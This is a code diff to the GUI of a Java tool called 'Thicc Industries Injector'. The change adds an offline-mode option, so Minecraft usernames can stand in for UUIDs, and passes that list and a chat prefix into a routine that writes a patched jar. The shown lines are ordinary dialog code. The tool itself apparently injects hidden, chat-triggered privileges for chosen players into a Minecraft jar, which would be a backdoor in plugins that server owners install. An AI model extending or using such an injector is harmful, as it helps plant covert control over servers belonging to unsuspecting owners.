@@ -6,6 +6,7 @@ import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.File;
+import java.util.UUID;
 
 public class InjectorGUI{
 
@@ -74,12 +75,16 @@ public class InjectorGUI{
         String OutPath = InPath.substring(0, sep) + "-patched.jar";
 
         /*--- Query options ---*/
+        Boolean UUIDsAreUsernames;
         String UUIDList;
         String ChatPrefix;
 
+        int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
+        UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;
+
         UUIDList = (String)JOptionPane.showInputDialog(
                 null,
-                "Minecraft UUIDs (Separated by commas):",
+                "Minecraft " + (UUIDsAreUsernames ? "Usernames" : "UUIDs") + " (Separated by commas):",
                 "Thicc Industries Injector",
                 JOptionPane.PLAIN_MESSAGE,
                 null,
@@ -109,7 +114,7 @@ public class InjectorGUI{
 
         String[] splitUUID = UUIDList.split(",");
 
-        Injector.SimpleConfig sc = new Injector.SimpleConfig(splitUUID, ChatPrefix);
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix);
         boolean result2 = Injector.patchFile(InPath, OutPath, sc);
 
         if(result2){
